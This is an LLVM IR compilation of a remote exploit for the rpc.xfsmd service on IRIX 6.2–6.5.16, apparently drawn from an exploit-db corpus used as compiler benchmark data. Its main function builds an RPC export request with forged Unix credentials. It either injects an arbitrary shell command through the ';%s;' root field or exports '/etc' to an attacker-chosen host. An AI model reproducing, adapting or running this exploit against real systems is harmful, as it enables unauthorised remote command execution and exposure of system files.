; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/remote/extr_21571.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/remote/extr_21571.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i32 }
%struct.TYPE_9__ = type { i32 }
%struct.hostent = type { i32, i32 }
%struct.sockaddr_in = type { %struct.TYPE_7__, i32, i32 }
%struct.TYPE_7__ = type { i32 }
%struct.TYPE_8__ = type { i32 }

@.str = private unnamed_addr constant [5 x i8] c"/etc\00", align 1
@__const.main.tm = private unnamed_addr constant %struct.timeval { i32 10, i32 0 }, align 4
@.str.1 = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM Sep 1999 poland  //lsd-pl.net/\0A\00", align 1
@.str.2 = private unnamed_addr constant [51 x i8] c"rpc.xfsmd for irix 6.2 6.3 6.4 6.5 6.5.16 IP:all\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [42 x i8] c"usage: %s address -c \22command\22 [-p port]\0A\00", align 1
@.str.4 = private unnamed_addr constant [49 x i8] c"       %s address -e address [-d dir] [-p port]\0A\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"c:p:e:d:\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [25 x i8] c"executing %s command... \00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"XFS_MNT_DIR:/tmp\0Aroot:;%s;\00", align 1
@.str.8 = private unnamed_addr constant [33 x i8] c"exporting %s directory to %s... \00", align 1
@.str.9 = private unnamed_addr constant [24 x i8] c"XFS_FS_NAME:%s\0Aroot:%s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@EADDRNOTAVAIL = common dso_local global i32 0, align 4
@errno = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.11 = private unnamed_addr constant [2 x i8] c".\00", align 1
@RPC_ANYSOCK = common dso_local global i32 0, align 4
@XFS_PROG = common dso_local global i32 0, align 4
@XFS_VERS = common dso_local global i32 0, align 4
@XFS_EXPORT = common dso_local global i32 0, align 4
@xdr_req = common dso_local global i32 0, align 4
@xdr_res = common dso_local global i32 0, align 4
@RPC_SUCCESS = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"ok\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.TYPE_9__*, align 8
  %16 = alloca i32, align 4
  %17 = alloca %struct.hostent*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca %struct.timeval, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.TYPE_8__, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %9, align 8
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8** %10, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %22 = bitcast %struct.timeval* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %22, i8* align 4 bitcast (%struct.timeval* @__const.main.tm to i8*), i64 8, i1 false)
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.2, i64 0, i64 0))
  %25 = load i32, i32* %4, align 4
  %26 = icmp slt i32 %25, 3
  br i1 %26, label %27, label %37

27:                                               ; preds = %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.3, i64 0, i64 0), i8* %30)
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.4, i64 0, i64 0), i8* %34)
  %36 = call i32 @exit(i32 -1) #4
  unreachable

37:                                               ; preds = %2
  br label %38

38:                                               ; preds = %56, %37
  %39 = load i32, i32* %4, align 4
  %40 = sub nsw i32 %39, 1
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  %43 = call i32 @getopt(i32 %40, i8** %42, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  store i32 %43, i32* %14, align 4
  %44 = icmp ne i32 %43, -1
  br i1 %44, label %45, label %57

45:                                               ; preds = %38
  %46 = load i32, i32* %14, align 4
  switch i32 %46, label %56 [
    i32 99, label %47
    i32 101, label %49
    i32 100, label %51
    i32 112, label %53
  ]

47:                                               ; preds = %45
  store i32 0, i32* %13, align 4
  %48 = load i8*, i8** @optarg, align 8
  store i8* %48, i8** %8, align 8
  br label %56

49:                                               ; preds = %45
  store i32 1, i32* %13, align 4
  %50 = load i8*, i8** @optarg, align 8
  store i8* %50, i8** %9, align 8
  br label %56

51:                                               ; preds = %45
  %52 = load i8*, i8** @optarg, align 8
  store i8* %52, i8** %10, align 8
  br label %56

53:                                               ; preds = %45
  %54 = load i8*, i8** @optarg, align 8
  %55 = call i32 @atoi(i8* %54)
  store i32 %55, i32* %12, align 4
  br label %56

56:                                               ; preds = %53, %45, %51, %49, %47
  br label %38

57:                                               ; preds = %38
  %58 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  store i8* %58, i8** %20, align 8
  %59 = load i32, i32* %13, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %67, label %61

61:                                               ; preds = %57
  %62 = load i8*, i8** %8, align 8
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0), i8* %62)
  %64 = load i8*, i8** %20, align 8
  %65 = load i8*, i8** %8, align 8
  %66 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %64, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0), i8* %65)
  br label %75

67:                                               ; preds = %57
  %68 = load i8*, i8** %10, align 8
  %69 = load i8*, i8** %9, align 8
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.8, i64 0, i64 0), i8* %68, i8* %69)
  %71 = load i8*, i8** %20, align 8
  %72 = load i8*, i8** %10, align 8
  %73 = load i8*, i8** %9, align 8
  %74 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %71, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0), i8* %72, i8* %73)
  br label %75

75:                                               ; preds = %67, %61
  %76 = load i32, i32* @AF_INET, align 4
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  store i32 %76, i32* %77, align 4
  %78 = load i32, i32* %12, align 4
  %79 = call i32 @htons(i32 %78)
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i32 %79, i32* %80, align 4
  %81 = load i8**, i8*** %5, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 1
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @inet_addr(i8* %83)
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %86 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %85, i32 0, i32 0
  store i32 %84, i32* %86, align 4
  %87 = icmp eq i32 %84, -1
  br i1 %87, label %88, label %105

88:                                               ; preds = %75
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 1
  %91 = load i8*, i8** %90, align 8
  %92 = call %struct.hostent* @gethostbyname(i8* %91)
  store %struct.hostent* %92, %struct.hostent** %17, align 8
  %93 = icmp eq %struct.hostent* %92, null
  br i1 %93, label %94, label %98

94:                                               ; preds = %88
  %95 = load i32, i32* @EADDRNOTAVAIL, align 4
  store i32 %95, i32* @errno, align 4
  %96 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  %97 = call i32 @exit(i32 -1) #4
  unreachable

98:                                               ; preds = %88
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %100 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %99, i32 0, i32 0
  %101 = load %struct.hostent*, %struct.hostent** %17, align 8
  %102 = getelementptr inbounds %struct.hostent, %struct.hostent* %101, i32 0, i32 1
  %103 = load i32, i32* %102, align 4
  %104 = call i32 @memcpy(i32* %100, i32 %103, i32 4)
  br label %117

105:                                              ; preds = %75
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %107 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %106, i32 0, i32 0
  %108 = bitcast i32* %107 to i8*
  %109 = load i32, i32* @AF_INET, align 4
  %110 = call %struct.hostent* @gethostbyaddr(i8* %108, i32 4, i32 %109)
  store %struct.hostent* %110, %struct.hostent** %17, align 8
  %111 = icmp eq %struct.hostent* %110, null
  br i1 %111, label %112, label %116

112:                                              ; preds = %105
  %113 = load i32, i32* @EADDRNOTAVAIL, align 4
  store i32 %113, i32* @errno, align 4
  %114 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  %115 = call i32 @exit(i32 -1) #4
  unreachable

116:                                              ; preds = %105
  br label %117

117:                                              ; preds = %116, %98
  %118 = load %struct.hostent*, %struct.hostent** %17, align 8
  %119 = getelementptr inbounds %struct.hostent, %struct.hostent* %118, i32 0, i32 0
  %120 = load i32, i32* %119, align 4
  %121 = call i64 @strchr(i32 %120, i8 signext 46)
  %122 = inttoptr i64 %121 to i8*
  store i8* %122, i8** %7, align 8
  %123 = icmp ne i8* %122, null
  br i1 %123, label %124, label %127

124:                                              ; preds = %117
  %125 = load i8*, i8** %7, align 8
  %126 = getelementptr inbounds i8, i8* %125, i64 1
  store i8 0, i8* %126, align 1
  br label %132

127:                                              ; preds = %117
  %128 = load %struct.hostent*, %struct.hostent** %17, align 8
  %129 = getelementptr inbounds %struct.hostent, %struct.hostent* %128, i32 0, i32 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @strcat(i32 %130, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11, i64 0, i64 0))
  br label %132

132:                                              ; preds = %127, %124
  %133 = load i32, i32* @RPC_ANYSOCK, align 4
  store i32 %133, i32* %11, align 4
  %134 = load i32, i32* @XFS_PROG, align 4
  %135 = load i32, i32* @XFS_VERS, align 4
  %136 = call %struct.TYPE_9__* @clnttcp_create(%struct.sockaddr_in* %18, i32 %134, i32 %135, i32* %11, i32 0, i32 0)
  store %struct.TYPE_9__* %136, %struct.TYPE_9__** %15, align 8
  %137 = icmp ne %struct.TYPE_9__* %136, null
  br i1 %137, label %141, label %138

138:                                              ; preds = %132
  %139 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  %140 = call i32 @exit(i32 -1) #4
  unreachable

141:                                              ; preds = %132
  %142 = load %struct.hostent*, %struct.hostent** %17, align 8
  %143 = getelementptr inbounds %struct.hostent, %struct.hostent* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 4
  %145 = call i32 @authunix_create(i32 %144, i32 0, i32 0, i32 0, i32* null)
  %146 = load %struct.TYPE_9__*, %struct.TYPE_9__** %15, align 8
  %147 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %146, i32 0, i32 0
  store i32 %145, i32* %147, align 4
  %148 = load %struct.TYPE_9__*, %struct.TYPE_9__** %15, align 8
  %149 = load i32, i32* @XFS_EXPORT, align 4
  %150 = load i32, i32* @xdr_req, align 4
  %151 = bitcast i8** %20 to i8*
  %152 = load i32, i32* @xdr_res, align 4
  %153 = bitcast %struct.TYPE_8__* %21 to i8*
  %154 = bitcast %struct.timeval* %19 to i64*
  %155 = load i64, i64* %154, align 4
  %156 = call i32 @clnt_call(%struct.TYPE_9__* %148, i32 %149, i32 %150, i8* %151, i32 %152, i8* %153, i64 %155)
  store i32 %156, i32* %16, align 4
  %157 = load i32, i32* %16, align 4
  %158 = load i32, i32* @RPC_SUCCESS, align 4
  %159 = icmp ne i32 %157, %158
  br i1 %159, label %160, label %164

160:                                              ; preds = %141
  %161 = load %struct.TYPE_9__*, %struct.TYPE_9__** %15, align 8
  %162 = call i32 @clnt_perror(%struct.TYPE_9__* %161, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  %163 = call i32 @exit(i32 -1) #4
  unreachable

164:                                              ; preds = %141
  %165 = load i32, i32* %13, align 4
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %168, label %167

167:                                              ; preds = %164
  br label %175

168:                                              ; preds = %164
  %169 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %21, i32 0, i32 0
  %170 = load i32, i32* %169, align 4
  %171 = icmp ne i32 %170, 0
  %172 = xor i1 %171, true
  %173 = zext i1 %172 to i64
  %174 = select i1 %172, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i64 0, i64 0)
  br label %175

175:                                              ; preds = %168, %167
  %176 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0), %167 ], [ %174, %168 ]
  %177 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* %176)
  %178 = load i32, i32* %3, align 4
  ret i32 %178
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @getopt(i32, i8**, i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, ...) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @memcpy(i32*, i32, i32) #2

declare dso_local %struct.hostent* @gethostbyaddr(i8*, i32, i32) #2

declare dso_local i64 @strchr(i32, i8 signext) #2

declare dso_local i32 @strcat(i32, i8*) #2

declare dso_local %struct.TYPE_9__* @clnttcp_create(%struct.sockaddr_in*, i32, i32, i32*, i32, i32) #2

declare dso_local i32 @clnt_pcreateerror(i8*) #2

declare dso_local i32 @authunix_create(i32, i32, i32, i32, i32*) #2

declare dso_local i32 @clnt_call(%struct.TYPE_9__*, i32, i32, i8*, i32, i8*, i64) #2

declare dso_local i32 @clnt_perror(%struct.TYPE_9__*, i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
